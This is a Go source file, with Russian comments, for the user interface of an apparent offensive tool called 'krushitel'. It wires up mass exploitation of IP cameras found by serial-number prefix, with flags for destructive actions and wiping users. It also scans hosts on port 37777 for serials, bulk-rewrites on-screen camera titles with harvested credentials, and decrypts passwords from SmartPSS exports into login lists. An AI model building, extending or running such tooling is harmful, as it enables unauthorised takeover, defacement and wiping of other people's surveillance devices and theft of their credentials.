package ui

// modes.go — сборка форм режимов + запуск РЕАЛЬНЫХ движков krushitel
// (exploit/scanner/cloud/xmlde/ironscan). Никаких симуляций.

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"krushitel/cloud"
	"krushitel/dhip"
	"krushitel/exploit"
	"krushitel/fwd"
	"krushitel/ironscan"
	"krushitel/scanner"
	"krushitel/smartpss"
	"krushitel/xmlde"
)

// ── режим 1: крушим (двухфазный: скан префиксов в RAM → крушим найденных) ──

func exploitForm() *formState {
	f := newFormState(tr("нужна кое какая информация"), func(m *model) {
		startExploitRun(m)
	})
	// вход двухфазного режима: префикс (>=10 симв.), файл префиксов,
	// файл серийников или инлайн через запятую — разбор в LoadTargetInput
	f.addStr(tr("префикс или файл (префиксы/серийники)"), true, false)
	if cfg.LastInput != "" {
		f.setDefault(cfg.LastInput) // сохранение последнего захода
	}
	f.addStr(tr("папка для результатов"), true, false)
	if cfg.LastOut != "" {
		f.setDefault(cfg.LastOut)
	}
	// 30 — рабочий дефолт: 200 одновременных handshake'ов глушат друг
	// друга (датаграммы роняются, туннели ловят stall). Больше = не
	// быстрее, проверено: при 20 потоках hit-rate вдвое выше.
	defThreads := 30
	if cfg.LastThreads > 0 {
		defThreads = cfg.LastThreads
	}
	f.addInt(tr("потоков"), defThreads)
	f.addBool(tr("снапы?"), cfg.Snaps)
	f.addBool("autogen .xml?", cfg.XML)
	return f
}

func startExploitRun(m *model) {
	RememberRun(m.form.fields[0].strVal, m.form.fields[1].strVal, m.threadsVal(30))
	inFile := m.form.fields[0].strVal
	outDir := m.form.fields[1].strVal
	threads := m.threadsVal(2)
	cfg.Snaps = m.form.fields[3].boolVal
	cfg.XML = m.form.fields[4].boolVal
	saveSettings()

	prefixes, direct, err := exploit.LoadTargetInput(inFile)
	if err != nil {
		showMsg(m, tr("ломаем"), red("[-] "+err.Error()))
		return
	}

	// Resume: в папке остался живой session-маркер (краш/esc прошлого
	// прогона) и ведомость done.txt. Предлагаем продолжить; отказ —
	// прогон заново (done.txt перезапишется движком). Скан-фаза при
	// этом всегда доезжает с чекпоинта/alive.txt — это не «заново».
	if sess := exploit.ReadSession(outDir); sess != nil {
		done := exploit.ReadDoneSet(filepath.Join(outDir, exploit.DoneFile))
		if len(done) > 0 {
			var question string
			if len(prefixes) > 0 {
				// серийники станут известны после скана — «осталось» не посчитать
				question = fmt.Sprintf(tr("прерванный прогон (%s): отработано %d. продолжить? (нет = заново)"),
					sess.InFile, len(done))
			} else {
				remaining := make([]string, 0, len(direct))
				for _, s := range direct {
					if _, ok := done[s]; !ok {
						remaining = append(remaining, s)
					}
				}
				question = fmt.Sprintf(tr("прерванный прогон (%s): отработано %d, осталось %d. продолжить с оставшихся? (нет = заново)"),
					sess.InFile, len(done), len(remaining))
			}
			confirm := newFormState(tr("ломаем"), func(m *model) {
				launchExploitRun(m, inFile, outDir, threads, prefixes, direct, m.form.fields[0].boolVal, false)
			})
			confirm.addBool(question, true)
			confirm.cur = 0
			m.form = confirm
			m.form.focus()
			return
		}
	}
	launchExploitRun(m, inFile, outDir, threads, prefixes, direct, false, false)
}

func launchExploitRun(m *model, inFile, outDir string, threads int, prefixes, direct []string, resume, triedSudo bool) {
	// Префлайт ДО переворота в stRun: папка результатов (+ xml-подпапка,
	// если импорт включён — это ровно тот кейс «включил в настройках,
	// а xml нет»). Фатал → красный диалог (sudo / проводник).
	probeDirs := []string{outDir}
	if cfg.XML {
		probeDirs = append(probeDirs, filepath.Join(outDir, "xml"))
	}
	for _, d := range probeDirs {
		if err := preflightDir(d); err != nil {
			fatalFileDialog(m, tr("ломаем)"), err, d, triedSudo, true,
				func() { launchExploitRun(m, inFile, outDir, threads, prefixes, direct, resume, true) },
				func(newPath string) {
					launchExploitRun(m, inFile, newPath, threads, prefixes, direct, false, false)
				})
			return
		}
	}
	// двухфазная статистика: скан-фаза + бой
	tp := &exploit.TwoPhaseStats{
		Scan:        &scanner.ScanStats{},
		Exp:         &exploit.Stats{},
		PrefixCount: len(prefixes),
		DirectCount: len(direct),
		ScanTotal:   int64(len(prefixes)) * scanner.SuffixCombos,
	}
	// на экране прогона — боевой заголовок, «need some info» остаётся
	// только на форме ввода
	r := newRunState(runExploit, tr("ломаем)"))
	r.exp = tp
	r.saveDir = outDir // шапка прогона: результаты пишутся сюда
	// лог прогона — в папку результатов (append между прогонами)
	r.openLog(filepath.Join(outDir, "log.txt"))
	// Глобальный лимит одновременных P2P-init'ов: oluhradar держит
	// min(workers,100) хендшейков с одного IP и облако это терпит —
	// 24 было слишком тесно, очередь пробками вставала.
	fwd.InitLimit = 100
	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	// session-маркер: живёт до чистого завершения прогона (движок
	// удалит), краш/esc — файл остаётся, следующий запуск предложит resume.
	// Prefixes — по ним resume узнаёт свои alive.txt/crashscan.json.
	exploit.WriteSession(outDir, exploit.SessionInfo{
		InFile:   inFile,
		Threads:  threads,
		Total:    len(prefixes) + len(direct),
		Started:  time.Now().Format("02.01.2006 15:04:05"),
		Prefixes: prefixes,
	})

	// Логирование: пишем АБСОЛЮТНО ВСЁ сетевое взаимодействие в log.txt
	logLine := func(line string) {
		r.writeLog(line)
		if cfg.Debug {
			select {
			case r.eventsCh <- "[dbg] " + line:
			default:
			}
		}
	}
	fwd.Debug = cfg.Debug
	fwd.LogHook = logLine
	cloud.LogHook = logLine
	dhip.LogHook = func(format string, args ...any) {
		logLine(fmt.Sprintf(format, args...))
	}
	exploit.LogHook = func(format string, args ...any) {
		logLine(fmt.Sprintf(format, args...))
	}

	opts := exploit.Opts{
		OutDir:      outDir,
		Snaps:       cfg.Snaps,
		XML:         cfg.XML,
		Titles:      cfg.Titles,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
		DummyLogin:  cfg.DummyLogin,
		DummyPass:   cfg.DummyPass,
		Resume:      resume,
		Destructive: cfg.Destructive,
		WipeUsers:   cfg.WipeUsers,
	}

	go func() {
		defer func() {
			fwd.LogHook = nil
			cloud.LogHook = nil
			dhip.LogHook = nil
			exploit.LogHook = nil
		}()
		exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, threads, opts, tp, r.eventsCh)
	}()
}

// ── режим 2: титры по списку ─────────────────────────────────────────

func titlesForm() *formState {
	f := newFormState(tr("OSDChanger"), func(m *model) {
		startTitlesRun(m)
	})
	f.addStr(tr("файл с камерами (results.txt)"), true, true)
	// 200 — пост-обработка: init-воронка (InitLimit=100) сама ограничит
	// одновременные хендшейки, воркеров можно много
	f.addInt(tr("потоков"), 200)
	return f
}

func startTitlesRun(m *model) {
	inFile := m.form.fields[0].strVal
	threads := m.threadsVal(1)

	cams, skipped, err := exploit.ParseResultsCreds(inFile)
	if err != nil {
		showMsg(m, tr("OSDChanger"), red("[-] "+tr("ошибка чтения входного файла: ")+err.Error()))
		return
	}
	if len(cams) == 0 {
		showMsg(m, tr("OSDChanger"), red("[-] "+tr("Файл пуст")))
		return
	}

	launchTitlesRun(m, inFile, threads, cams, skipped)
}

func launchTitlesRun(m *model, inFile string, threads int, cams []exploit.CamCred, skipped int) {
	stats := &exploit.TitlesStats{}
	r := newRunState(runTitles, tr("OSDChanger"))
	r.ttl = stats
	// лог — рядом с входным файлом: results.txt → results_titles.log
	r.openLog(strings.TrimSuffix(inFile, filepath.Ext(inFile)) + "_titles.log")

	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	if skipped > 0 {
		line := fmt.Sprintf(tr("[!] пропущено строк мимо формата: %d"), skipped)
		r.writeLog(line)
		r.eventsCh <- line
	}

	opts := exploit.Opts{
		Titles:      true,
		ChanText:    cfg.ChannelText,
		CustomTexts: cfg.CustomTexts[:],
	}

	go exploit.RunTitles(ctx, cams, threads, opts, stats, r.eventsCh)
}

// ── режим 3: smartpss (бывший 4) ────────────────────────────────────────────────

func xmlXMLForm() *formState {
	f := newFormState(tr("xml → креды"), func(m *model) {
		inFile := m.form.fields[0].strVal
		outFile := m.form.fields[1].strVal

		data, err := os.ReadFile(inFile)
		if err != nil {
			showMsg(m, tr("xml → креды"), red("[-] "+err.Error()))
			return
		}
		creds, err := xmlde.DecodeXML(data)
		if err != nil || len(creds) == 0 {
			showMsg(m, tr("xml → креды"), red(tr("[!] нет декодированных кредов")))
			return
		}
		var lines []string
		for _, c := range creds {
			lines = append(lines, fmt.Sprintf("%s:%s@%s:%s", c.Username, c.Password, c.Domain, c.Port))
		}
		if err := os.WriteFile(outFile, []byte(strings.Join(lines, "\n")+"\n"), 0644); err != nil {
			showMsg(m, tr("xml → креды"), red("[-] "+err.Error()))
			return
		}
		showMsg(m, tr("xml → креды"),
			green(fmt.Sprintf(tr("[+] %d кред(ов) -> %s"), len(creds), outFile)))
	})
	f.addStr(tr("файл с результатами (SmartPSS export)"), true, true)
	f.addStr(tr("название файла для кредов"), true, false)
	return f
}

func xmlBlobForm() *formState {
	f := newFormState(tr("blob → пароль"), func(m *model) {
		blob := m.form.fields[0].strVal
		plain, err := xmlde.DecodeBlob(blob)
		if err != nil {
			showMsg(m, tr("blob → пароль"), red("[-] "+err.Error()))
			return
		}
		showMsg(m, tr("blob → пароль"), tr("   пароль: ")+green(plain))
	})
	f.addStr(tr("вставь base64 blob"), true, false)
	return f
}

// txt → SmartPSS xml (креды → импорт-файлы для SmartPSS)
func txtXMLForm() *formState {
	f := newFormState(tr("креды → xml"), func(m *model) {
		inFile := m.form.fields[0].strVal
		outFile := m.form.fields[1].strVal

		data, err := os.ReadFile(inFile)
		if err != nil {
			showMsg(m, tr("креды → xml"), red("[-] "+err.Error()))
			return
		}
		creds, skipped := xmlde.ParseCreds(data)
		if len(creds) == 0 {
			showMsg(m, tr("креды → xml"), red(tr("[!] нет разобранных кредов")))
			return
		}
		imports := make([]smartpss.DeviceImport, len(creds))
		for i, c := range creds {
			imports[i] = smartpss.DeviceImport{Serial: c.Domain, Login: c.Username, Password: c.Password}
		}
		files, err := smartpss.WriteXML(outFile, imports)
		if err != nil {
			showMsg(m, tr("креды → xml"), red("[-] "+err.Error()))
			return
		}
		msg := green(fmt.Sprintf(tr("[+] %d камер -> %s"), len(creds), outFile))
		if skipped > 0 {
			msg += yellow(fmt.Sprintf(tr(" (мимо формата: %d)"), skipped))
		}
		if files > 1 {
			msg += dim(fmt.Sprintf(tr(" (%d файла(ов) по 64)"), files))
		}
		showMsg(m, tr("креды → xml"), msg)
	})
	f.addStr(tr("файл с кредами (SN,login:pass)"), true, true)
	f.addStr(tr("выходной xml-файл"), true, false)
	return f
}

// ── режим 5: ищем префиксы ───────────────────────────────────────────

func prefixForm() *formState {
	f := newFormState(tr("префиксы"), func(m *model) {
		startPrefixRun(m)
	})
	f.addStr(tr("IP цели или файл со списком хостов"), true, false)
	f.addInt(tr("порт"), 37777)
	f.addInt(tr("потоков"), 500)
	f.addStr(tr("выходной файл (база, без расширения)"), true, false)
	f.addStr(tr("фильтр моделей (через запятую, пусто = все)"), false, false)
	return f
}

func startPrefixRun(m *model) {
	tgt := m.form.fields[0].strVal
	port := m.form.fields[1].intVal
	threads := m.threadsVal(2)
	outBase := m.form.fields[3].strVal
	filterRaw := m.form.fields[4].strVal

	// парсим фильтр моделей: через запятую, uppercase, пустые куски пропускаем.
	var modelFilters []string
	if filterRaw != "" {
		for _, part := range strings.Split(filterRaw, ",") {
			p := strings.TrimSpace(part)
			if p != "" {
				modelFilters = append(modelFilters, strings.ToUpper(p))
			}
		}
	}

	var targets []string
	if fileExists(tgt) {
		var err error
		targets, err = ironscan.LoadTargets(tgt)
		if err != nil {
			showMsg(m, tr("префиксы"), red("[-] "+err.Error()))
			return
		}
	} else {
		targets = []string{tgt}
	}
	if len(targets) == 0 {
		showMsg(m, tr("префиксы"), red(tr("[-] файл без хостов :(")))
		return
	}

	r := newRunState(runPrefix, tr("префиксы"))
	r.preTotal = len(targets)
	// лог — рядом с базой: base_prefix.txt / base_serials.txt / base_log.txt
	r.openLog(outBase + "_log.txt")
	// Отмена по esc: ctx пробивает пробы (ironscan.Run ctx-aware).
	ctx, cancel := context.WithCancel(context.Background())
	r.cancel = cancel
	m.form = nil
	m.run = r
	m.state = stRun

	// лог находок + префиксы/серийники в конце — как в старом modePrefix.
	type snModel struct{ sn, model string }
	var mu sync.Mutex
	var found []snModel
	go func() {
		err := ironscan.Run(ctx, ironscan.Options{
			Targets:     targets,
			Port:        port,
			Timeout:     5 * time.Second,
			Concurrency: threads,
			Retries:     2,
		}, func(res ironscan.Result) {
			atomic.AddInt64(&r.preScanned, 1)
			sn := ironscan.SanitizeSerial(res.Serial)
			if sn != "" {
				atomic.AddInt64(&r.preFound, 1)
				mu.Lock()
				found = append(found, snModel{sn, res.Model})
				mu.Unlock()
				line := fmt.Sprintf("[+] %-16s SN: %s", res.Target, sn)
				if res.Model != "" {
					line += tr("  модель: ") + res.Model
				}
				if res.Firmware != "" {
					line += tr("  прошивка: ") + res.Firmware
				}
				select {
				case r.eventsCh <- line:
				default:
				}
			}
		})
		if err != nil {
			r.genErr = err.Error()
		}

		// дедуп по серийнику (модель — первая НЕпустая встретившаяся) → префиксы (первые 10 символов) → файлы.
		mu.Lock()
		uniq := make([]snModel, 0, len(found))
		idx := make(map[string]int)
		for _, e := range found {
			if i, ok := idx[e.sn]; ok {
				// тот же SN с другой IP: апгрейдим пустую модель непустой
				if uniq[i].model == "" && e.model != "" {
					uniq[i].model = e.model
				}
				continue
			}
			idx[e.sn] = len(uniq)
			uniq = append(uniq, e)
		}
		mu.Unlock()

		// фильтрация по модели: если фильтры заданы — оставляем только совпавших
		filtered := uniq
		if len(modelFilters) > 0 {
			filtered = make([]snModel, 0, len(uniq))
			for _, e := range uniq {
				upper := strings.ToUpper(e.model)
				for _, f := range modelFilters {
					if strings.Contains(upper, f) {
						filtered = append(filtered, e)
						break
					}
				}
			}
		}

		var prefixes []string
		seenP := make(map[string]struct{})
		for _, e := range filtered {
			if len(e.sn) < 10 {
				continue
			}
			p := e.sn[:10]
			if _, ok := seenP[p]; !ok {
				seenP[p] = struct{}{}
				prefixes = append(prefixes, p)
			}
		}
		// _serials.txt — всегда все (без фильтра), чтобы данные не терялись
		if len(uniq) > 0 {
			lines := make([]string, 0, len(uniq))
			for _, e := range uniq {
				if e.model != "" {
					lines = append(lines, e.sn+";"+e.model)
				} else {
					lines = append(lines, e.sn)
				}
			}
			_ = os.WriteFile(outBase+"_serials.txt", []byte(strings.Join(lines, "\n")+"\n"), 0644)
		}
		if len(prefixes) > 0 {
			_ = os.WriteFile(outBase+"_prefix.txt", []byte(strings.Join(prefixes, "\n")+"\n"), 0644)
		}
		// итоговое сообщение с учётом фильтра
		if len(modelFilters) > 0 {
			select {
			case r.eventsCh <- fmt.Sprintf(
				tr("[+] серийников: %d, после фильтра: %d, префиксов: %d"),
				len(uniq), len(filtered), len(prefixes)):
			default:
			}
		} else if len(prefixes) > 0 {
			select {
			case r.eventsCh <- fmt.Sprintf(tr("[+] серийников: %d, префиксов: %d"), len(uniq), len(prefixes)):
			default:
			}
		}
		atomic.StoreInt64(&r.preDone, 1)
	}()
}

// ── хелперы ──────────────────────────────────────────────────────────

// threadsVal — потоки из формы (вызывать ДО обнуления m.form).
func (m *model) threadsVal(fieldIdx int) int {
	if m.form == nil || fieldIdx >= len(m.form.fields) {
		return 4
	}
	n := m.form.fields[fieldIdx].intVal
	if n < 1 {
		n = 4
	}
	return n
}

// dedup — дедуп с сохранением порядка.
func dedup(in []string) []string {
	seen := make(map[string]struct{})
	out := make([]string, 0, len(in))
	for _, s := range in {
		if _, ok := seen[s]; ok {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}

// countLines — число непустых строк файла (0 при ошибке).
func countLines(path string) int {
	f, err := os.Open(path)
	if err != nil {
		return 0
	}
	defer f.Close()
	n := 0
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.TrimSpace(sc.Text()) != "" {
			n++
		}
	}
	return n
}
